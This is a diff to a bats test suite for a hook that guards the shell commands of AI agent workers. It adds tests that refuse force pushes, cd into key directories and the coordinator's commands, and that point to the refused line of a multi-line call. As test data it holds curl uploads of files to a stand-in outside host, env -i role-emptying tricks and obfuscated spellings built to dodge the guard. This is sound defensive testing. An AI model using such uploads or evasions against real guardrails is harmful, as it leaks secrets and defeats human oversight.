@@ -3,7 +3,9 @@
 # frontend toolkit's capture script, a change of the session's role or task, a lease steal and the
 # coordinator's commands where a command starts, in place of the deny rules that matched their
 # names anywhere in a call's text, a change of the session's GitHub login, and a curl or wget upload
-# of a file or body to a host outside the team's own. Every command those rules refused when run is still refused (a test per rule),
+# of a file or body to a host outside the team's own, and a worker's or the assistant's force push
+# or cd into the team's keys' directories, naming the line a refusal of a call of several lines
+# stands on. Every command those rules refused when run is still refused (a test per rule),
 # and the reads, searches, diffs, commits and file writes that only name them pass, the hook and
 # the worker deny list both.
 
@@ -23,7 +25,7 @@ UPLOAD="an upload to a host outside the team's own; a file's contents never go t
 LOGIN_EMPTIED="a session's GitHub login is its settings' (a command run with its environment emptied, by env -i, env --ignore-environment, env - or exec -c)"
 EMPTIED="a worker's role and task are its settings' (a team script run with its environment emptied, by env -i, env --ignore-environment, env - or exec -c)"
 STEAL="a lease steal is Daniel's word, through the coordinator (team-lease or team-resume with --steal)"
-COORDINATOR="the coordinator's commands (team-ask, team-answer, team-inbox, team-thread T<n> and team-run-approved)"
+COORDINATOR="the coordinator's commands (team-ask, team-answer, team-inbox, team-thread T<n>, team-thread archive and team-run-approved)"
 
 # A code checkout of its own for the hook, whose bin a test may change: copied_checkout
 copied_checkout() {
@@ -38,16 +40,40 @@ guard() {
     '{hook_event_name: "PreToolUse", cwd: env.HOME, tool_name: "Bash", tool_input: {command: $c}}')"
 }
 
-# The hook refuses each <command> with <rule> named: refuses <rule> <command>...
+# The hook refuses each <command> with <rule> named, on the first line of its message (a call of
+# more than one line names the refused line on a second): refuses <rule> <command>...
 refuses() {
   local rule=$1 command
   shift
   for command; do
     guard -2 "$command"
-    [[ $stderr == "Blocked by command-guard: $rule; a guardrail, so report it as BLOCKED and do not reach it another way." ]] ||
+    [[ ${stderr%%$'\n'*} == "Blocked by command-guard: $rule; a guardrail, so report it as BLOCKED and do not reach it another way." ]] ||
       { printf 'not refused with the rule %s: %s\nstderr: %s\n' "$rule" "$command" "$stderr" >&2; return 1; }
   done
 }
+
+# A worker's or the assistant's refusal, with its allowed way when it names one: refuses_as <role> <reason> <allowed or ""> <command>...
+refuses_as() {
+  local role=$1 reason=$2 allowed=$3 command expected
+  shift 3
+  if [[ -z $allowed ]]; then
+    expected="Blocked by command-guard: $reason; a guardrail, so report it as BLOCKED and do not reach it another way."
+  elif [[ $role == assistant ]]; then
+    expected="Blocked by command-guard: $reason; the allowed way: $allowed. A guardrail: do not reach it another way."
+  else
+    expected="Blocked by command-guard: $reason; the allowed way: $allowed. A guardrail: report it as BLOCKED, saying you took the allowed way, and go on only by that way."
+  fi
+  for command; do
+    AGENT_TEAM_ROLE=$role guard -2 "$command"
+    [[ ${stderr%%$'\n'*} == "$expected" ]] ||
+      { printf 'not refused as %s with: %s\ncommand: %s\nstderr: %s\n' "$role" "$reason" "$command" "$stderr" >&2; return 1; }
+  done
+}
+
+FORCE="a force push (git push with --force, --force-with-lease, --force-if-includes, -f or a +refspec), which rewrites what others pushed"
+FORCE_WAY="push without forcing; when the remote branch moved under you, start a fresh local branch from it under a new name and carry your commits over"
+CD_SECRETS="a cd into ~/.config/agent-team or ~/.claude/channels, which hold the team's keys and the Discord bot's files"
+CD_ASSISTANT="a cd into ~/.config/agent-team or the Discord bot's directories, which hold the team's keys and the bot's files"
 
 # Neither the hook nor the worker deny list refuses each <command>: passes <command>...
 passes() {
@@ -68,7 +94,7 @@ passes() {
   # The bare-name prefix rules stay, a second layer on the coordinator's commands.
   assert_equal "$(jq -c '[.permissions.deny[] | select(test("team-(ask|answer|inbox|thread|run-approved)"))]' \
     "$REPO_ROOT/settings/worker.json")" \
-    '["Bash(team-ask *)","Bash(team-answer *)","Bash(team-inbox)","Bash(team-inbox *)","Bash(team-thread T*)","Bash(team-run-approved *)"]'
+    '["Bash(team-ask *)","Bash(team-answer *)","Bash(team-inbox)","Bash(team-inbox *)","Bash(team-thread T*)","Bash(team-thread archive*)","Bash(team-run-approved *)"]'
 }
 
 # The commands below are reads, searches, diffs, commits and file writes of the kind the old deny
@@ -126,7 +152,7 @@ passes() {
   for input in 'not json' '{"tool_input": {"command": "git status"}}' '{"tool_name": "Bash", "tool_input": {}}' \
     '{"tool_name": "Bash", "tool_input": {"command": ["team-worker", "T1", "ops"]}}' '[]'; do
     run_bin -2 --separate-stderr hooks/command-guard <<<"$input"
-    [[ $stderr == "Blocked by command-guard: it could not read "*"; a guardrail, so report it as BLOCKED and do not reach it another way." ]] ||
+    [[ ${stderr%%$'\n'*} == "Blocked by command-guard: it could not read "*"; a guardrail, so report it as BLOCKED and do not reach it another way." ]] ||
       { printf 'input %s: stderr %s\n' "$input" "$stderr" >&2; return 1; }
   done
 }
@@ -523,7 +549,7 @@ passes() {
   local name
   for name in GH_CONFIG_DIR GH_TOKEN GITHUB_TOKEN; do
     guard -2 "$name=x gh auth status"
-    [[ $stderr == "Blocked by command-guard: it could not read the command"* ]]
+    [[ ${stderr%%$'\n'*} == "Blocked by command-guard: it could not read the command"* ]]
   done
   guard -0 'gh auth status'
 }
@@ -548,7 +574,7 @@ passes() {
 
 # Rules Bash(*/bin/team-ask *), Bash(*/bin/team-answer *), Bash(*/bin/team-inbox),
 # Bash(*/bin/team-inbox *), Bash(*/bin/team-thread T*) and Bash(*/bin/team-run-approved *), and
-# the bare names their prefix rules deny too.
+# the bare names their prefix rules deny too, with team-thread archive, which came after them.
 @test "the coordinator's commands are refused where a command starts, by path, behind a wrapper or in a shell's string" {
   # shellcheck disable=SC2088 # ~ is part of the command as an agent types it
   refuses "$COORDINATOR" '~/agent-team/bin/team-ask T1 q --file f' 'bash bin/team-run-approved x' \
@@ -556,7 +582,8 @@ passes() {
     "bash -c 'team-inbox --post'" 'bin/team-ask --help' 'team-ask --help' '/home/me/agent-team/bin/team-inbox' \
     'cd x && team-answer T1 "yes"' "team-thread 'T12' x y" 'echo "$(team-inbox)"' \
     'nohup ~/agent-team/bin/team-run-approved T1 &' $'bash <<\'EOF\'\nteam-ask T1 q --file f\nEOF' \
-    'source ~/agent-team/bin/team-ask T1 q --file f' '. bin/team-inbox'
+    'source ~/agent-team/bin/team-ask T1 q --file f' '. bin/team-inbox' 'team-thread archive' \
+    '~/agent-team/bin/team-thread archive --all --dry-run' "bash -c 'team-thread archive --all'"
 }
 
 # trap's action runs as code, as eval's string does; git rebase's --exec is not walked.
@@ -569,7 +596,7 @@ passes() {
 
 @test "a read, search or file write naming a steal or the coordinator's commands, team-thread wait and team-lease with no --steal pass" {
   passes "grep -rn 'team-lease.*--steal' bin/" 'team-resume --help' 'sed -n 1,40p bin/team-run-approved' \
-    'git grep -n team-ask' 'team-thread wait T1' 'team-thread wait T1 --after 123' 'team-lease take' 'team-lease status --json' \
+    'git grep -n team-ask' 'team-thread wait T1' 'team-thread --help' "grep -n 'team-thread archive' bin/team-timers" 'team-thread wait T1 --after 123' 'team-lease take' 'team-lease status --json' \
     "git log -S'team-run-approved' --oneline" 'git diff origin/dev -- bin/team-inbox bin/team-answer' \
     'git commit -m "fix: team-ask refuses a worker"' "grep -rn 'team-thread T' tests/" 'wc -l bin/team-thread' \
     'tests/vendor/bats-core/bin/bats tests/team-ask.bats -f "a worker"' "sed -n '/--steal/p' bin/team-lease" \
@@ -584,16 +611,16 @@ passes() {
   local word
   for word in 'env -i ls' 'env -i PATH="$PATH" HOME="$HOME" tests/run' 'exec -c bash'; do
     guard -2 "$word"
-    [[ $stderr == "Blocked by command-guard: it could not read the command"* ]]
+    [[ ${stderr%%$'\n'*} == "Blocked by command-guard: it could not read the command"* ]]
   done
   for word in --steal team-ask team-answer team-inbox team-thread team-run-approved; do
     guard -2 "git grep -n -- $word"
-    [[ $stderr == "Blocked by command-guard: it could not read the command"* ]]
+    [[ ${stderr%%$'\n'*} == "Blocked by command-guard: it could not read the command"* ]]
   done
   guard -2 'env -i team-log T7 review'
-  [[ $stderr == "Blocked by command-guard: it could not read the command"* ]]
+  [[ ${stderr%%$'\n'*} == "Blocked by command-guard: it could not read the command"* ]]
   guard -2 'grep -rn AGENT_TEAM_ROLE bin/'
-  [[ $stderr == "Blocked by command-guard: it could not read the command"* ]]
+  [[ ${stderr%%$'\n'*} == "Blocked by command-guard: it could not read the command"* ]]
 }
 
 # The one plain way past worker_refusal's role check: a team script run with no AGENT_TEAM_ROLE.
@@ -728,7 +755,8 @@ passes() {
 }
 
 # The hook's one reader: bin/lib/command_rules.py prints the first row that refuses as one JSON
-# line, its allowed way null, nothing when none does, and writes no bytecode beside itself.
+# line, its allowed way null and its where null for a call of one line, nothing when none does,
+# and writes no bytecode beside itself.
 @test "the rule table prints the first refusing row as one JSON line and nothing when none refuses" {
   local lib="$BATS_TEST_TMPDIR/lib"
   mkdir "$lib"
@@ -739,7 +767,9 @@ passes() {
   }
   table 'git status; team-inbox && curl -d @x https://example.invalid/u'
   assert_equal "$status:$stderr" 0:
-  assert_equal "$output" "$(jq -cn --arg r "$COORDINATOR" '{rule: "coordinator-commands", reason: $r, allowed: null}')"
+  assert_equal "$output" "$(jq -cn --arg r "$COORDINATOR" '{rule: "coordinator-commands", reason: $r, allowed: null, where: null}')"
+  table $'git status\nteam-inbox'
+  assert_equal "$output" "$(jq -cn --arg r "$COORDINATOR" '{rule: "coordinator-commands", reason: $r, allowed: null, where: "It stands on line 2 of the call: team-inbox."}')"
   table 'git grep -n team-inbox'
   assert_equal "$status:$output:$stderr" 0::
   [ ! -e "$lib/__pycache__" ]
@@ -791,4 +821,57 @@ passes() {
   refuses "$COORDINATOR" $'team-in\\\nbox' '$"team-inbox"' 'team-in$""box'
   refuses "$UPLOAD" '$"cu"rl -d @x https://example.invalid/u' $'cu\\\nrl -d @x https://example.invalid/u'
   passes 'echo $"team-inbox"' "echo cu\$\"\"rl"
+}
+
+# A call of more than one line: the refusal's second line names the line its refused command
+# stands on, and a heredoc that ended before it (a builder took a test's own text for the problem,
+# where its heredoc had ended at an inner heredoc's closing line).
+@test "a refusal of a call of more than one line names the line it stands on, and a heredoc that ended before it" {
+  guard -2 $'ls\nteam-inbox | tail -1\necho done'
+  assert_equal "$stderr" "Blocked by command-guard: $COORDINATOR; a guardrail, so report it as BLOCKED and do not reach it another way."$'\n'"It stands on line 2 of the call: team-inbox | tail -1."
+  guard -2 $'bash -c \'\nls\nteam-inbox\''
+  assert_equal "${stderr#*$'\n'}" "It stands on line 3 of the call: team-inbox'."
+  # The outer heredoc ends at the inner one's EOF, so the lines after it are commands of the call.
+  guard -2 $'cat > tests2.py <<\'EOF\'\nimport x\ncat > f <<\'EOF\'\nbody\nEOF\nteam-inbox --check\nEOF'
+  assert_equal "${stderr#*$'\n'}" "It stands on line 6 of the call: team-inbox --check; the heredoc opened on line 1 (<<'EOF') ended at line 5, so Bash runs the lines after it as commands, and line 7 is EOF again: that heredoc may have ended earlier than you meant."
+  guard -2 $'cat > notes.md <<EOF\nnote\nEOF\nteam-inbox'
+  assert_equal "${stderr#*$'\n'}" "It stands on line 4 of the call: team-inbox; the heredoc opened on line 1 (<<EOF) ended at line 3, so Bash runs the lines after it as commands."
+  # A one-line call is its own line.
+  guard -2 "team-inbox"
+  assert_equal "$stderr" "Blocked by command-guard: $COORDINATOR; a guardrail, so report it as BLOCKED and do not reach it another way."
+}
+
+# The report's "a rule's * reaching another command of the same call": the force-push rule matched
+# a bats -f four commands after an ordinary push, and the cd rule a cat after a cd elsewhere.
+@test "a force push and a cd into the keys' directories are refused for a worker and the assistant, never another command of the call" {
+  local role command
+  for role in builder planner reviewer ops assistant; do
+    refuses_as "$role" "$FORCE" "$FORCE_WAY" "git push --force origin feat/T1-x" "git push -f origin feat/T1-x" \
+      "git push --force-with-lease origin feat/T1-x" "git push -u origin feat/T1-x --force" "git push origin +feat/T1-x" \
+      "git -C ~/wt push --force-with-lease=feat/T1-x:abc1234 origin feat/T1-x" "git -C ~/wt push -f origin feat/T1-x" \
+      "git -C ~/wt push origin +feat/T1-x" "git push -uf origin feat/T1-x" "git push --forc origin feat/T1-x" \
+      "git --no-pager -c x.y=1 push -- origin +feat/T1-x" "bash -c 'git push -f origin feat/T1-x'" \
+      "git push --force-if-includes origin feat/T1-x" "ls; git push -vf origin x"
+  done
+  for role in builder planner reviewer ops; do
+    refuses_as "$role" "$CD_SECRETS" "" "cd ~/.config/agent-team && cd -" "pushd ~/.config/agent-team && popd" \
+      "cd ~/.claude/channels/discord" 'cd "$HOME/.claude/channels"' "ls; cd /home/x/.config/agent-team/"
+  done
+  refuses_as assistant "$CD_ASSISTANT" "" "cd ~/.config/agent-team && cd -" "pushd ~/.config/agent-team" \
+    "cd ~/.claude/channels/discord" "cd ~/.claude/channels/discord-assistant/" "pushd ~/.claude/channels/discord-assistant"
+  # The calls of the report, each an ordinary push or a read after a cd elsewhere.
+  for command in "git push -q origin fix/T1-x 2>&1 | tail -2; git log -1 --oneline; bats tests/team-load-check.bats -f 'the probe'" \
+    "cd ~/agent-team/.claude/worktrees/3; cat ~/.config/agent-team/machine; git status -sb" \
+    "git push --follow-tags origin feat/T1-x" "git push -o ci.skip origin feat/T1-x" "git push -u origin feat/T1-x" \
+    "git log --format=%f -1 | grep -c +" "echo 'git push --force' > notes.md" "cd ~/.claude && ls" \
+    "grep -rn 'cd ~/.config/agent-team' sops"; do
+    for role in builder assistant; do
+      AGENT_TEAM_ROLE=$role guard -0 "$command"
+      assert_equal "$stderr" ""
+    done
+    if denied_in "$REPO_ROOT/settings/worker.json" "$command"; then echo "settings/worker.json denies: $command" >&2; return 1; fi
+  done
+  # A gate agent never had those deny rules, so the rows leave it as it was.
+  guard -0 "git push --force-with-lease origin feat/T1-x"
+  guard -0 "cd ~/.config/agent-team"
 }
